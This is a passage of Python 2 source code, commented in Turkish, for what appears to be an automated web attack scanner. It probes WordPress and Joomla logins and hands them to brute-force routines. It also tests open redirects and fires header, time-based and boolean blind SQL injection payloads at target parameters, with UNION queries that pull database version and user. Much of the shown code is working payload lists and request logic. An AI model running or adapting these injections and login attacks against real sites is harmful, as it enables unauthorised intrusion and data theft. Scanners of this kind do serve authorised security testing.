	"<title>folder listing" in response  or \
	"<table summary=\"directory listing" in response or  \
	"browsing directory" in response or  \
	"[to parent directory]" in response:
	    yaz("[#] Index Of Sayfa tespit Edildi "+url,True)
	    
	    if ".sql" in response:
		yaz("[#] SQL DOSYASI tespit Edildi "+url,True)
    



def wpmi(url):
    
    try:
	wpmisource=urllib2.urlopen(url+"/wp-login.php").read()
	
	if "wp-submit" in wpmisource: 
	    return True  
	else:
	    return False
    
    
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Wordpresmi Kontrol HTTP 500 Dondu " +url,True)
		sqlkontrol(e.read(),urlnormal)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
	#yaz(mesaj)
    except:
	print "Normal acarken Hata oldu"    

def joomlami(url):
    try:
	joomlamisource=urllib2.urlopen(url+"/administrator").read()
	
	    
	if "mod-login-username" in joomlamisource or \
	"modlgn_username" in joomlamisource or \
	"com_login" in joomlamisource:
	    return True
	else:
	    return False
	
    except urllib2.HTTPError,  e:
		if(e.code==500):
		    yaz("[#] Joomla Kontrol HTTP 500 Dondu " +url,True)
		    sqlkontrol(e.read(),urlnormal)
	
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
	#yaz(mesaj)
    except:
	print "Normal acarken Hata oldu"      

def normalac(url):
    
    try:
     
	ajaxtespit=["jquery.ajax","$.ajax","xmlhttprequest","msxml2.xmlhttp"]
	socket=["new WebSocket(","ws:"]
	
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0")]
	response = opener.open(url).read().lower()
	
	
	
	
	
	if "/wp-content/" in response:
	    if wpmi(url)==True:
		wordpressbrute(url)	
	else:
	    if wpmi(url)==True:
		wordpressbrute(url)	
		
	    
	
	if "Joomla" in response:
	    if joomlami(url)==True:
		joomlatoken(url)
	else:
	    if joomlami(url)==True:
		joomlatoken(url)	
	    
	
	list=sre.findall("([0-9a-z\-_\.]+\@[0-9a-z\-_\.]+\.[0-9a-z\-_\.]+)",response)
	if len(list)>0:
	    yaz("[#] Email Tespit Edildi "+url+"\n"+str(list),True)
		
	for ajx in ajaxtespit:
	    if ajx in response:
		yaz("[#] Ajax Tespit Edildi "+url,True)
		
	for sck in socket:
	    if sck in response:
		yaz("[#] WebSocket Tespit Edildi "+url,True)
		
	if "<?xml" not in response or "%PDF" not in response:
	    if "<?" in response and "?>" in response:
		yaz("[#] PHP kod tespit Edildi "+url,True)
	    elif "<%" in response and "%>" in response:
		yaz("[#] ASP kod tespit Edildi "+url,True)
		
		
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] Normal Giris HTTP 500 Dondu " +url,True)
	    sqlkontrol(e.read(),urlnormal)

    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
	#yaz(mesaj)
    except:
	print "Normal acarken Hata oldu"
    
def openredirect(gelenurl):
    
    redirect=["http://www.google.com",
              "www.google.com",
              "google.com",
              "%2f%2fwww.google.com%3f",
              "https://www.google.com",
              "//google.com",
              "//https://www.google.com",
              "5;URL='https://www.google.com'"]
    
    for rlinkler in redirect:
	try:
	
	    urlnormal=gelenurl.replace("=", "="+rlinkler+"?")
	    urlac = urllib2.urlopen(urlnormal)
	    response = urlac.read()
	    if "<title>Google</title>" in response:
		yaz("[#] Open Redirect BULUNDU : " + urlnormal,True)

	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Open Redirect 500 Dondu " +urlnormal,True)
	
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
		#yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"   
	

def headerinjection(url):
    try:
	print "Header SQL injection deneniyor..."
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
	                     ("X-Forwarded-For", "127.0.0.1'"),
	                     ("Referer", "http://www.google.com'"),
	                     ("Accept-Language","bekir'")]
	response = opener.open(url)
	headers = response.info()
	if headers.has_key("Set-Cookie"):
	    yollanacakcookie=headers['Set-Cookie']
	    cookieinjection(url, yollanacakcookie)
	sqlkontrol(temizle(response.read()),"[Header INJECTION]"+url)
	
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Header Injection Http 500 Dondu  / Internal Server Error " +url,True)
		
    except urllib2.URLError,  e:
	if "Time" in e.reason:
	    mesaj="Time Out oldu"
	    yaz(mesaj,True)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)           


def posttimebased(url,params,method):
    
    timesql=[" WAITFOR DELAY '0:0:50';--",
             "'+(SELECT 1 FROM (SELECT SLEEP(50))A)+'",
             "(SELECT 1 FROM (SELECT SLEEP(50))A)",
             "1') AND SLEEP(50) AND ('LoUL'='LoUL",
             "' WAITFOR DELAY '0:0:50' and 'a'='a;--",
             "' and  sleep(50) and  'a'='a",
             "' WAITFOR DELAY '0:0:50';--",
             "' IF 1=1 THEN dbms_lock.sleep(50);",
             " ' IF 1=1 THEN dbms_lock.sleep(50);",
             " ' WAITFOR DELAY '0:0:50';--",
             "; SLEEP(50)",
             " SLEEP(50)",
             "' SLEEP(50)--",
             "' SLEEP(50)",
             " pg_sleep(50)",
             " ' pg_sleep(50)",
             " PG_DELAY(50)",
             " ' PG_DELAY(50)",
             " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " DBMS_LOCK.SLEEP(50);",
             " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--",
             "1,'0');waitfor delay '0:0:50;--",
             "');waitfor delay'0:0:50';--",
             ");waitfor delay '0:0:50';--",
             "' and pg_sleep(50)--",
             "1) and pg_sleep(50)--",
             "\") and pg_sleep(50)--",
             "') and pg_sleep(50)--",
             "1)) and pg_sleep(50)--",
             ")) and pg_sleep(50)--",
             "')) and pg_sleep(50)--",
             "\")) or pg_sleep(50)--",
             "')) or pg_sleep(50)--",
              "' and pg_sleep(50)--",
             "1) and sleep(50)--",
             "\") and sleep(50)--",
             "') and sleep(50)--",
             "1)) and sleep(50)--",
             ")) and sleep(50)--",
             "')) and sleep(50)--",
             "\")) or sleep(50)--",
             "' or pg_sleep(50)--",
             "')) or sleep(50)--"]
    
    

    
    

	
    postgetdict={}
    postgetdict=params.copy()
    
    for timeler in timesql:
	for key,value in params.items():		
	    if key in postgetdict:
		postgetdict[key]=value+timeler
		try:
		    parametresaf = urllib.urlencode(postgetdict)
		    if method=="GET":
			print "Time Based GET SQL testi yapiliyor"
			y11 = temizle(urllib.urlopen(url+"?"+parametresaf,timeout=40).read())
			postgetdict.clear()
			postgetdict=params.copy()
				
		    else:
			print "Time Based POST SQL testi yapiliyor"
			y11 = temizle(urllib2.urlopen(url, parametresaf,timeout=40).read())
			postgetdict.clear()
			postgetdict=params.copy()
		    sqlkontrol(y11,"[#] POST DA SQL ERROR BULUNDU / \nVERISI = "+parametresaf+"\n URL = "+url)
		  

    
		except urllib2.HTTPError,e:
		    print e.reason
		    if(e.code==500):
			yaz("[#] "+method+" Time Based Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
			sqlkontrol(e.read(),url)
			
		except socket.timeout:
		    yaz("[#] URL= "+url+"\n"+method+" Time BASED SQL BULUNDU \n TIME BASED VERISI\n\n = "+parametresaf,True)
		    
		except urllib2.URLError,  e:
		    if "Time" in e.reason:
			mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(url,timeler)
			yaz(mesaj,True)
		except:
		    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)       
	    

							
def timebased(url):
    
    timesql=[" WAITFOR DELAY '0:0:50';--",
             "') OR SLEEP(50)"
             "1') AND SLEEP(50) AND ('LoUL'='LoUL",
             "' WAITFOR DELAY '0:0:50' and 'a'='a;--",
             "' and  sleep(50) and  'a'='a",
             "' WAITFOR DELAY '0:0:50';--",
             " IF 1=1 THEN dbms_lock.sleep(50);",
             " ' IF 1=1 THEN dbms_lock.sleep(50);",
             "' waitfor delay '0:0:50';--",
             " ' WAITFOR DELAY '0:0:50';--",
             "; SLEEP(50)",
             " SLEEP(50)",
             "' SLEEP(50)--",
             "' SLEEP(50)",
             " pg_sleep(50)",
             " ' pg_sleep(50)",
             " PG_DELAY(50)",
             " ' PG_DELAY(50)",
             " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " DBMS_LOCK.SLEEP(50);",
             " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--",
             "1,'0');waitfor delay '0:0:50;--",
             "');waitfor delay'0:0:50';--",
             ");waitfor delay '0:0:50';--",
             "' and pg_sleep(50)--",
             "1) and pg_sleep(50)--",
             "\") and pg_sleep(50)--",
             "') and pg_sleep(50)--",
             "1)) and pg_sleep(50)--",
             ")) and pg_sleep(50)--",
             "')) and pg_sleep(50)--",
             "\")) or pg_sleep(50)--",
             "')) or pg_sleep(50)--",
             "1) and sleep(50)--",
             "\") and sleep(50)--",
             "') and sleep(50)--",
             "1)) and sleep(50)--",
             ")) and sleep(50)--",
             "')) and sleep(50)--",
             "\")) or sleep(50)--",
             "' or pg_sleep(50)--",
             "')) or sleep(50)--",
             "(SELECT 1 FROM (SELECT SLEEP(50))A)"]
    
    for timeler in timesql:
	try:
	    yenitime={}
	    #yenipath=""
	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
		yenitime[key]=value[0]+timeler
		#yenipath+="?"+key+"="+value[0]
	    
	    host=urlparse.urlparse(url).netloc
	    dosya=urlparse.urlparse(url).path
	    #yeniurl="http://"+host+dosya+yenipath
	    
	    
		
	    #query=urlparse.urlparse(url+"&").query
	    #r = re.compile('=(.*?)&')
	    #m = r.search(query)
	    #if m:
		#print m.group(1)
	                      
	    print "Time Based SQL Test Yapiliyor ... "+timeler
	    encoded_args = urllib.urlencode(yenitime)
	    responsex = urllib2.urlopen("http://"+host+dosya+"?"+encoded_args,timeout=40)
	    responsey = temizle(responsex.read())
	    sqlkontrol(responsey,"[#] SQL ERROR BULUNDU / VERISI = "+timeler+"\n URL = "+url)
		
	except urllib2.HTTPError,  e:
	    print e.reason
	    if(e.code==500):
		yaz("[#] Timebased Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
		sqlkontrol(e.read(),url)
		
	except socket.timeout:
	    yaz("[#] Time BASED SQL BULUNDU \n TIME BASED VERISI = "+"http://"+host+dosya+"?"+timeler,True)
	    
	except urllib2.URLError,  e:
	    if "Time" in e.reason:
		mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(url,timeler)
		yaz(mesaj,True)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)       


def blindpost(url,params,method):
 
   
    #try:
	#normaldict={}
	#for key,value in params.items():
	    #if value=="":
		#value="0x94"
	    #normaldict[key]=value+"0x94"
	    
	#parametresaf = urllib.urlencode(normaldict)
	#if method=="GET":
	    #print "Normal Blind GET SQL testi yapiliyor"
	    #normalkaynak = temizle(urllib.urlopen(url+"?"+parametresaf).read())	    
	#else:
	    #print "Normal Blind POST SQL testi yapiliyor"
	    #normalkaynak = temizle(urllib2.urlopen(url, parametresaf).read())
	    
    #except urllib2.HTTPError,  e:
	#if(e.code==500):
	    #yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaf,True)
	
    #except urllib2.URLError,  e:
	#mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		##yaz(mesaj)
    #except:
	#mesaj="Bilinmeyen hata olustu\n"    
    
   
    post_string	= [" 'aNd 1=1",
	                    "' anD 1=1",
	                    "' and 1=(select 1)+'",
	                    "'+(SELECT 1)+'",
	                    "'+(SELECT 999999)+'",
	                    "' OR 'bk'='bk",
	                    "bekir' AND 'a'='a",
	                    "' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;",
	                    "' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)",
	                    " SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
	                    "' SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",                    
	                    "' or''='",
	                    "bekir 'or''='",
	                    "' and 1=1",
	                    "' and 1=1 'a'='a",
	                    "' and 1=1 'a'='a",
	                    "' aNd 1=2",
	                    "' aNd 1=MID((database()),1,1)>1",
	                    "' aNd 2=MID((@@version,1,1)--+",
	                    "' aNd 3=MID((@@version,1,1)--+",
	                    "' aNd 4=MID((@@version,1,1)--+",
	                    "' aNd 5=MID((@@version,1,1)--+",
	                    "' or 1=1 --",
	                    "a' or 1=1 --",
	                    "' or 1=1 #",
	                    "or 1=1 --",
	                    "') or ('x'='x",
	                    "or username LIKE '%a%",
	                    "' or username LIKE '%a%",
	                    "' HAVING 1=1--",
	                    "' and+1=convert(int,@@version)",
	                    "' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
	                    "'a' || 'b' ",
	                    "' SELECT IF(1=1,'true','false')",
	                    "') or ('1'='1--",
	                    "' GROUP BY 99999",
	                    "if(true=false,1,SLEEP(5))--+",
	                    "and+if(true%21=true,1,SLEEP(5))--+",
	                    "and+if(1=2,1,SLEEP(5))--+",
	                    "if(1%21=1,1,SLEEP(5))--+",
	                    "if(true=true,1,SLEEP(5))--+",
	                    "if(2=2,1,SLEEP(5))--+",
	                    "and+true=false--+",
	                    "and+false%21=false--+",
	                    "and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
	                    "union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",
	                    "' if(true=false,1,SLEEP(5))--+",
	                    "' and+if(true%21=true,1,SLEEP(5))--+",
	                    "' and+if(1=2,1,SLEEP(5))--+",
	                    "' if(1%21=1,1,SLEEP(5))--+",
	                    "' if(true=true,1,SLEEP(5))--+",
	                    "' if(2=2,1,SLEEP(5))--+",
	                    "' and+true=false--+",
	                    "' and+false%21=false--+",
	                    "' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
	                    "' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+"] 	
    
    bitiskarakter=["","--","/*","--+",";",";--","--","#"]
    
    #true_strings=["' OR 'bk'='bk"]
    #false_strings=["' OR 'bk'='bk1111"]
    
    true_strings = ["' or 1=1",
                    "')'a'='a'",
                    "')'a'='a",
                    "'or 'a'='a'",
                    "bekir' AND 'a'='a",
                    "' OR 'bk'='bk",
                    "' and 1=(select 1)+'",
                    "' aNd 1=1",
                    " and 1=1",
                    " ' and 1=1",
                    " and 'a'='a",
                    "' and 'a'='a",
                    "' and 'a'='a",
                    " and 1 like 1",
                    " and 1 like 1/*",
                    " and 1=1--",
                    " group by 1",
                    "'+(SELECT 1)+'",
                    "' and 1=(select 1)+'",
                    "'+aNd+10>1"]    
    
    false_strings =["' or 1=2",
                    "')'a'='b'",
                    "')'a'='b",
                    "'or 'a'='b'",
                    "bekir' AND 'a'='b",
                    "' OR 'bk'='bekir",
                    "' and 1=(select 999999)+'",
                    "' aNd 1=2",
                    " and 1=2",
                    " ' and 1=2",
                    " and 'a'='b",
                    "' and 'a'='b",
                    "' and 'a'='b",
                    " and 1 like 2",
                    " and 1 like 2/*",
                    " and 1=2--",
                    " group by 99999",
                    "'+(SELECT 99999)+'",
                    "' and 1=(select 2)+'",
                    "'+aNd+10>20"]	
    for sonkarakter in bitiskarakter:
	iyy = 0
	while iyy < len(true_strings):
	    
	
	    
		normaldict={}
		truedict={}
		falsedict={}
		normaldict=params.copy()	
		truedict=params.copy()
		falsedict=params.copy()
		
		print "Post Deneniyor : "+ url
	    
		
		
		for key,value in params.items():
		    normalkaynak=""
		    if key in normaldict:
			if value=="":
			    value="0x94"
			normaldict[key]=value
			print "POST Normal Deneniyor..."
			parametresafn = urllib.urlencode(normaldict)
			if method=="GET":
			    print "Blind Normal GET SQL testi yapiliyor"
			    normalkaynak = temizle(urllib.urlopen(url+"?"+parametresafn).read())
			    
			    normaldict.clear()
			    normaldict=params.copy()				    
			else:
			    print "Blind Normal POST SQL testi yapiliyor"
			    normalkaynak = temizle(urllib2.urlopen(url, parametresafn).read())
			    normaldict.clear()
			    normaldict=params.copy()
			
		#-----------------------------------------------------------------------------------		
		    if key in truedict:
			print "POST True Deneniyor: "+true_strings[iyy]+sonkarakter
			if value=="":
			    value="0x94"
			truedict[key]=value+true_strings[iyy]+sonkarakter
			try:
			    parametresaft = urllib.urlencode(truedict)
			    if method=="GET":
				print "Blind GET SQL testi yapiliyor"
				truekaynak = temizle(urllib.urlopen(url+"?"+parametresaft).read())
				truedict.clear()
				truedict=params.copy()			    
			    else:
				print "Blind POST SQL testi yapiliyor"
				truekaynak = temizle(urllib2.urlopen(url, parametresaft).read())
				truedict.clear()
				truedict=params.copy()
			    sqlkontrol(truekaynak,method+" "+url)
    
				
			except urllib2.HTTPError,  e:
			    if(e.code==500):
				yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaft,True)
			    
			except urllib2.URLError,  e:
			    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
				    #yaz(mesaj)
			except:
			    mesaj="Bilinmeyen hata olustu\n"  
			    
			    
			if key in falsedict:

			    print "POST False Deneniyor: "+false_strings[iyy]+sonkarakter
			    if value=="":
				value="0x94"
			    falsedict[key]=value+false_strings[iyy]+sonkarakter	
			    try:
				parametresaff = urllib.urlencode(falsedict)
				if method=="GET":
				    print "Blind GET SQL testi yapiliyor"
				    falsekaynak = temizle(urllib.urlopen(url+"?"+parametresaff).read())
				    
				    falsedict.clear()
				    falsedict=params.copy()				    
				else:
				    print "Blind POST SQL testi yapiliyor"
				    falsekaynak = temizle(urllib2.urlopen(url, parametresaff).read())
				    falsedict.clear()
				    falsedict=params.copy()	
				    
				sqlkontrol(falsekaynak,method+" SQL INJECTION "+url+"\n Yollanan Veri="+parametresaff)
	
	    
				
			    except urllib2.HTTPError,  e:
				if(e.code==500):
				    yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaff,True)
				
			    except urllib2.URLError,  e:
				mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
					#yaz(mesaj)
			    except:
				mesaj="Bilinmeyen hata olustu\n"  		    
			    #if (comparePages(truekaynak,normalkaynak,url," BLIND ") > comparePages(truekaynak,falsekaynak,url," BLIND ")):
    
			    if normalkaynak==falsekaynak:
				if truekaynak!=falsekaynak:
				    
				    comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION BULUNDU URL = "+url+" \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
		

				    #comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION BULUNDU URL = "+url+" \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
				    debug=1
			    #comparePages(y1kaynak,y2kaynak,url,"[#] BLind "+method+" Sayfada Degisiklik oldu  !!![+]"+url+"\nYollanan Veri ="+false_strings[iyy]+sonkarakter+"\n")	
			    iyy=iyy+1 
			    
	
		

def postget(url, params, method):
	
    postgetdict={}
    postgetdict=params.copy()
    
    for key,value in params.items():
	
	try:	    
	    if key in postgetdict:
		
		postgetdict[key]=value+"'"
		parametre = urllib.urlencode(postgetdict)
		if method=="GET":
		    print "GET SQL testi yapiliyor"
		    f = urllib.urlopen(url+"?"+parametre)
		else:
		    print "POST SQL testi yapiliyor"
		    f = urllib2.urlopen(url, parametre)
		sqlkontrol (temizle(f.read()),"[#] SQL ERROR BULUNDU \n LINK = "+url+"\n Veri= "+parametre)
		postgetdict.clear()
		postgetdict=params.copy()		
	    

    
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("POST "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data ="+parametre+ "\n"+urlnormal,True)
	    
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		    #yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)       
    


def comparePages(page1,page2,deurl,info):

    #bakalim1=set(list(page1.split("\n")))
    #bakalim2=set(list(page2.split("\n")))
    
    #toplamsatir=""
    
    #varrr=False
    #for satir1 in bakalim1:
	#for satir2 in bakalim2:
	    #if satir1!=satir2:
		#varrr=True
		##mesaj1="Link %s  \n" % (deurl)
		#mesaj2=info+"\n"
		##mesaj3="[#] Veri yollaninca sayfada degisen degerler var / Degisen Satirlar var\n"
		#toplamsatir+=satir1+"\n"
		
    #if varrr==True:
	#print "Gerekli bilgi log dosyasina yazildi\n"
	#yaz(mesaj2+"\n",True)
	#varrr=False
	#toplamsatir=""
	
		
    tmp1 = re.split("<[^>]+>",page1)
    tmp2 = re.split("<[^>]+>",page2) 
    count1 = 0;
    count2 = 0;
    
    
    
    for i in range(len(tmp1)):
	if page2.find(tmp1[i]) < 0:
	    if "action=" not in tmp1[i]:
		mesaj="Link %s  \n" % (deurl)
		mesaj+=info+"\n"
		mesaj+="[#] Veri yollaninca sayfada degisen degerler var / Degisen Satirlar = %s \n" % (tmp1[i])
		yaz(mesaj+"\n",True)
		count1+=1
		ran=random.randrange(1, 100000, 2)
		Debugyaz("debug/"+str(ran)+"false.html",mesaj+"\n\n\n\n\n"+page2)
		Debugyaz("debug/"+str(ran)+"true.html",mesaj+"\n\n\n\n\n"+page1)
    
    
    
    for i in range(len(tmp2)):
	if page1.find(tmp2[i]) < 0:
	    count2+=1
	    ##print max(count1, count2)
    return max(count1, count2)

		
		
def sqlkontrol(response,urlnormal):
    
    print "SQL hata mesaji kontrol ediliyor"
    if re.search("Microsoft OLE DB Provider for SQL Server",response,re.DOTALL):
	mesaj= "[#] %s MS-SQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("\[Microsoft\]\[ODBC Microsoft Access Driver\] Syntax error",response,re.DOTALL):
	mesaj= "[#] %s MS-Access error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC SQL Server Driver\]",response,re.DOTALL):
	mesaj= "[#] %s MS-SQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC Access Driver\]",response,re.DOTALL):
	mesaj= "[#] %s MS-Access error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft JET Database Engine",response,re.DOTALL):
	mesaj= "[#] %s MS Jet database engine error" % urlnormal
	yaz(mesaj,True)
    if re.search("ADODB.Command.*error",response,re.DOTALL):
	mesaj= "[#] %s ADODB Error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft VBScript runtime",response,re.DOTALL):
	mesaj= "[#] %s VBScript runtime error" % urlnormal
	yaz(mesaj,True)
    if re.search("Type mismatch",response,re.DOTALL):
	mesaj= "[#] %s VBScript / ASP error" % urlnormal
	yaz(mesaj,True)
    if re.search("Server Error.*System\.Data\.OleDb\.OleDbException",response,re.DOTALL):
	mesaj= "[#] %s ASP .NET OLEDB Exception" % urlnormal
	yaz(mesaj,True)
    if re.search("Invalid SQL statement or JDBC",response,re.DOTALL):
	mesaj= "[#] %s Apache Tomcat JDBC error" % urlnormal
	yaz(mesaj,True)
    if re.search("Warning: mysql_fetch_array",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)	
    if re.search("Warning.*supplied argument is not a valid MySQL result",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*on line",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*at line",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("Warning.*mysql_.*\(\)",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("ORA-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
	mesaj= "[#] %s Oracle DB Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("DorisDuke error",response,re.DOTALL):
	mesaj= "[#] %s DorisDuke error\n" % urlnormal
	yaz(mesaj,True)
    if re.search("javax\.servlet\.ServletException",response,re.DOTALL):
	mesaj= "[#] %s Java Servlet error" % urlnormal
	yaz(mesaj,True)
    if re.search("org\.apache\.jasper\.JasperException",response,re.DOTALL):
	mesaj= "[#] %s Apache Tomcat error" % urlnormal
	yaz(mesaj,True)
    if re.search("Warning.*failed to open stream",response,re.DOTALL):
	mesaj= "[#] %s PHP error" % urlnormal
	yaz(mesaj,True)
    if re.search("Fatal Error.*on line",response,re.DOTALL):
	mesaj= "[#] %s PHP error" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Warning: mysql_num_rows():",response,re.DOTALL):
	mesaj= "[#] %s MYSQL ERROR " % urlnormal
	yaz(mesaj,True)
	
    if re.search("Unclosed quotation mark",response,re.DOTALL):
	mesaj= "[#] %s MSSQL ERROR " % urlnormal
	yaz(mesaj,True)
    
    if re.search("java.sql.SQLException",response,re.DOTALL):
	mesaj= "[#] %s Java SQL ERROR " % urlnormal
	yaz(mesaj,True)
	
    if re.search("SqlClient.SqlException",response,re.DOTALL):
	mesaj= "[#] %s SqlClient ERROR " % urlnormal
	yaz(mesaj,True)
	
    if re.search("Incorrect syntax near",response,re.DOTALL):
	mesaj= "[#] %s SQL ERROR " % urlnormal
	yaz(mesaj,True)
	
    if re.search("PostgreSQL query failed",response,re.DOTALL):
	mesaj= "[#] %s PostgreSQL ERROR " % urlnormal
	yaz(mesaj,True)
	
    if re.search("500 - Internal server error",response,re.DOTALL):
	mesaj= "[#] %s Internal server error " % urlnormal
	yaz(mesaj,True)
	
    if re.search("Unclosed quotation mark",response,re.DOTALL):
	mesaj= "[#] %s MSSQL ERROR" % urlnormal
	yaz(mesaj,True)
	
    if re.search("java.sql.SQLException",response,re.DOTALL):
	mesaj= "[#] %s Java Exception" % urlnormal
	yaz(mesaj,True)
    
    if re.search("valid PostgreSQL result",response,re.DOTALL):
	mesaj= "[#] %s PostgreSQL Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Oracle.*Driver",response,re.DOTALL):
	mesaj= "[#] %s PostgreSQL Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Procedure '[^']+' requires parameter '[^']+'",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)

    if re.search("Sybase message:",response,re.DOTALL):
	mesaj= "[#] %s Sybase Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Column count doesn't match:",response,re.DOTALL):
	mesaj= "[#] %s MySQL Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Dynamic Page Generation Error:",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("<b>Warning<b>: ibase_",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Dynamic SQL Error",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("\[Macromedia\]\[SQLServer JDBC Driver\]",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("An illegal character has been found in the statement",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("A Parser Error \(syntax error\)",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("where clause",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("PostgreSQL.*ERROR",response,re.DOTALL):
	mesaj= "[#] %s PostgreSQL Exception" % urlnormal
	yaz(mesaj,True)
	
